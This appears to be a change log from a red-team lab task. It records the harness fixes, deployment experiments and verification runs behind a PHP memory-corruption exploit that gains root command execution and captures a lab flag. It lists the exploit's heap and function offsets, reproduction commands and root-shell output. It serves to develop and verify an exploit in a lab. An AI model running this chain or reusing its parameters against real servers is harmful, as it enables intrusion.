# Code changes — fail-fast loop

Status: 2026-10-27. Task 001. This is the code-history companion to
`ATTACK-LOG.md`. The log records commands, observations, and lessons; this file records
what changed in the code, why, and which exact files produced the flag.

## Rule

The pinned specimen is the exploit source of truth:
`specimen/stealmybitcoin_poc.py`, sha256
`eed0a0d670f9d85539ec7f272a0a42e8bde7080f50c6918efcf14caca9ce82f0`.
The loop did **not** rewrite the exploit. It changed the harness, the deployment
experiments, and one wrong-delta copy. The final capture used the pinned specimen, the
base four-worker compose, and the final harness.

## Baseline before the loop

| File | Role | sha256 |
|---|---|---|
| `specimen/stealmybitcoin_poc.py` | Pinned exploit; `HEAP_CARRIER_DELTA=0x8400000`, `HEAP_CARRIER_OFFSET=0x16D1D8`, `ZIF_SYSTEM_FROM_DTOR=-0x204bc0` | `eed0a0d6…` |
| `lab/compose.yaml` | Base lab: four CLI workers, nginx, `internal` network | `15ed40de…` |
| `iterations/run_attempt.sh` | Did not exist | — |
| `iterations/one-worker.yaml` | Did not exist | — |
| `iterations/specimen-wrong-delta.py` | Did not exist | — |
| `.dsh/skills/verify-task-001/` | Did not exist | — |

## Version table

| V | File | Change | Observed | Final? |
|---|---|---|---|---|
| V0 | baseline | Pinned specimen + base compose | `make lab-up`: healthy | yes, as the exploit source |
| V1 | `iterations/run_attempt.sh` | Initial harness; no `DOCKER_CONFIG`; output handling not preserved | Direct CLI reached `[health]` then `RemoteDisconnected`; the one-worker compose failed with `mkdir /home/jedi/.docker: permission denied` | no |
| V2 | `iterations/run_attempt.sh` | Added `export DOCKER_CONFIG="$REPO/.docker"`; pre-created `$OUT` | One-worker attempt: `FileExistsError: /out/run-loop-one-worker` | no |
| V3 | `iterations/run_attempt.sh` | Temp log + trap; no pre-create; post-run `mkdir`/copy; append-only guard | One-worker-c: `heap: expected one strict address, found 0`; upload-off: no producer OOM; wrong-delta: false proof | yes |
| V4 | `iterations/one-worker.yaml` | New override: `PHP_CLI_SERVER_WORKERS: "1"` | One worker: no reusable poisoned worker | no; experiment |
| V5 | `verify/mutation-off.yaml` + `.ini` | Existing override; no code change | Upload progress off: no producer OOM | no; negative control |
| V6 | `iterations/specimen-wrong-delta.py` | New copy; one-line `HEAP_CARRIER_DELTA = 0x8400000` → `0x0` | Both leaks succeeded; `execution_proof_verified: false` | no; experiment |
| V7 | pinned specimen + base compose + V3 harness | No new exploit code | Heap `0x7ea964c00000`; code `0x61b9e0112930`; flag `FLAG{task001_php8426_lab_9f3c2a}` | **yes** |

The first-loop V1/V2 harness files were overwritten by V3. This rerun preserves the
three versions in `iterations/versions/` and re-executes the failure modes:
`run_attempt-v1.sh` (no `DOCKER_CONFIG`, no pre-create) reproduces the direct
`RemoteDisconnected` and the `/home/jedi/.docker` compose failure;
`run_attempt-v2.sh` (`DOCKER_CONFIG`, pre-create) reproduces the `FileExistsError`;
`run_attempt-v3.sh` is the final harness. The hashes below are the preserved files.

## Harness diff

Final file: `iterations/run_attempt.sh`, sha256
`8803702197bc235d7ea62079b05f10e500618f5752c5e7dc5801a0f2c08f6560`.

Changes, in order:

```diff
 REPO="/home/jedi/abliterated/redteam"
+# V2: every direct docker call must use the workspace config, not /home/jedi/.docker
+export DOCKER_CONFIG="$REPO/.docker"
+mkdir -p "$DOCKER_CONFIG"
 TASK="$REPO/tasks/0001-stealmybitcoin"
 EVID="$TASK/evidence"
 OUT="$EVID/run-loop-$ATTEMPT"
-LOG="$OUT/attempt.log"
+if [ -e "$OUT" ]; then
+  echo "[abort] evidence dir exists: $OUT; use a new attempt id" >&2
+  exit 2
+fi
+LOG_TMP="$(mktemp)"
+trap 'rm -f "$LOG_TMP"' EXIT

-# V2: pre-created the PoC output dir; removed in V3
-mkdir -p "$OUT"
 set +e
 timeout 180 docker run --rm --network "container:$NET" \
@@
-  python "$SPECIMEN" --url "$TARGET" --output-dir "/out/run-loop-$ATTEMPT" 2>&1 | tee "$LOG"
+  python "$SPECIMEN" --url "$TARGET" --output-dir "/out/run-loop-$ATTEMPT" 2>&1 | tee "$LOG_TMP"
 rc=${PIPESTATUS[0]}
+
+mkdir -p "$OUT"
+cp "$LOG_TMP" "$OUT/attempt.log"
 echo "exit=$rc" | tee -a "$OUT/attempt.log"
 exit "$rc"
```

Why: the first harness had two bugs. It did not set `DOCKER_CONFIG`, so a direct
`docker compose` call tried to create `/home/jedi/.docker`; and it pre-created the PoC's
output directory, so `output.mkdir(exist_ok=False)` failed before the attack. The final
harness uses a temp log, lets the PoC create its own evidence directory, and refuses to
overwrite an existing attempt ID.

## Deployment experiment: one worker

`iterations/one-worker.yaml`, sha256
`a40df2d01f79e7861a6b7058db833cec35657564c1d2667e697aa0414720a6b7`:

```yaml
services:
  php:
    environment:
      PHP_CLI_SERVER_WORKERS: "1"
```

Used only for the one-worker hypothesis; not used in the final capture.

## Exploit experiment: wrong heap carrier

`iterations/specimen-wrong-delta.py`, sha256
`3e6a88463937444e63b97afbdd9d17736d5485f5a49b153e0f1e773f93117b2d`:

```diff
--- specimen/stealmybitcoin_poc.py
+++ iterations/specimen-wrong-delta.py
@@ -87,7 +87,7 @@
 # Distance from the leaked chunk base to the controlled "hold" field, measured
 # in a local four-worker Alpine setup.
-HEAP_CARRIER_DELTA = 0x8400000
+HEAP_CARRIER_DELTA = 0x0
 HEAP_CARRIER_OFFSET = 0x16D1D8
```

Used only for the carrier hypothesis; not used in the final capture. The final uses the
original `HEAP_CARRIER_DELTA = 0x8400000`.

## Existing controls used, not changed

- `verify/mutation-off.yaml` and `verify/mutation-off.ini` — upload-progress-off control.
- `verify/mutation-badapp.yaml` and `verify/bad-php-version.php` — broken-page control.
- `lab/compose.yaml` — the four-worker base lab, unchanged.
- `lab/php/Dockerfile`, `lab/nginx/nginx.conf`, `lab/php/php-version.php` — unchanged.

## New verification code

- `.dsh/skills/verify-task-001/SKILL.md` — the registered pstack-style skill; sha256
  `d311e48947c6eceb245c8ded876fbb9071855b5999ccca3abf40d083b682c614`.
- `.dsh/skills/verify-task-001/features/` — the five-feature map; `exploit-chain.md`
  sha256 `83f6309e1ce6e3fafd514d418746aa199c706690aa03d70bfd263a95a9e38b9b`.
- `iterations/ATTACK-LOG.md`, `iterations/ATTACK-PROMPT.md`, `iterations/CODE-CHANGES.md`
  — the loop history and refined prompt.
- `tasks/0001-stealmybitcoin/verify/SKILL.md` — task-local pointer to the registered
  skill; `README.md`/`HANDOFF.md`/`SKILL-ARCHITECTURE.md` — links and current state.

## The final code that flagged the capture

| Artifact | sha256 |
|---|---|
| `specimen/stealmybitcoin_poc.py` | `eed0a0d670f9d85539ec7f272a0a42e8bde7080f50c6918efcf14caca9ce82f0` |
| `lab/compose.yaml` | `15ed40dee9376b744c1389fb52d4b42b7ae0d9483d4d0f641794f0adeabf5b63` |
| `iterations/run_attempt.sh` | `8803702197bc235d7ea62079b05f10e500618f5752c5e7dc5801a0f2c08f6560` |
| `evidence/run-loop-final/final.response.body` | `1bd611520912940ae508b782de0b7ac3c9c8ab53ef9b7d3c7fb7175ff6a19830` |
| `evidence/run-loop-final/final.json` | `047e7d3cc0d0f2da0a87df748b5825cc478517afce6fcdfae241f3e582f79eb7` |
| `evidence/run-loop-final/run.json` | `7b73ef3b936a8ac6137b3df8106853f8109042621e635be5432b97539daff875` |
| `evidence/run-loop-final-v2/final.response.body` | `ab5140a412610bd645dd0423774e5fd3710778355206a4bd215a8f1498f14e2e` |
| `evidence/run-loop-final-v2/final.json` | `be38a73a15954954de43f6c90dea812ccc110abf8dd8588762f88f91b0281b42` |
| `evidence/run-loop-final-v2/run.json` | `3efacb03c643c774378e1a05b438d71f7e41dec575cd521990d9d961fd2918ae` |
| `verify/VERIFY-REPORT.json` | `7867c647ca1b85de3cd6fa4a5b20501433133df03b05bca7e316158962e8f229` |
| `evidence/MANIFEST.sha256` | `b6d084cbbac9a13d79abd0f95240261e8107db47976b5227abbe114b26b728c3` |

Final run:

```sh
make lab-up
iterations/run_attempt.sh final task001-nginx-1 \
  http://127.0.0.1:8080/php-version.php
```

Result: `[heap] 0x7ea964c00000`; `[code] 0x61b9e0112930`; nonce
`27c3a0c37fe49e43`; `execution_proof_verified: true`; exit 0; body:

```text
27c3a0c37fe49e43
uid=0(root) gid=0(root) groups=0(root)
475939146625902132d3507a85afee3a19483f2ebe9078370bc8f5911f0869bc  /usr/local/bin/print-flag
FLAG{task001_php8426_lab_9f3c2a}
```

Then `make verify` passed 5/5: static calibration, benign baseline, live attack attempt 3
(`run-verify-20261027T091403Z-2`, heap `0x7ea964c00000`, code `0x61b9e0112930`),
mutation A, mutation B. The rerun captured again in `run-loop-final-v2` (nonce
`f5051bc60195565b`, heap `0x79e74b800000`, code `0x5f579df12930`) and `make verify`
passed 5/5 with live attempt 3 `run-verify-20261027T094909Z-2`.

## What did not change

The pinned exploit, the base compose, the app, the flag, the nginx config, the PHP
Dockerfile, the mutation overrides, and the verification scripts. The final exploit code
is the ground truth; the loop changed the harness, the deployment experiments, and the
documentation.

## Reproduction

1. `make lab-up`.
2. `iterations/run_attempt.sh final-2 task001-nginx-1 http://127.0.0.1:8080/php-version.php`.
3. `make verify`.
4. `make lab-down`.

Use a new attempt ID each time. The `run_attempt.sh` guard refuses to overwrite evidence.
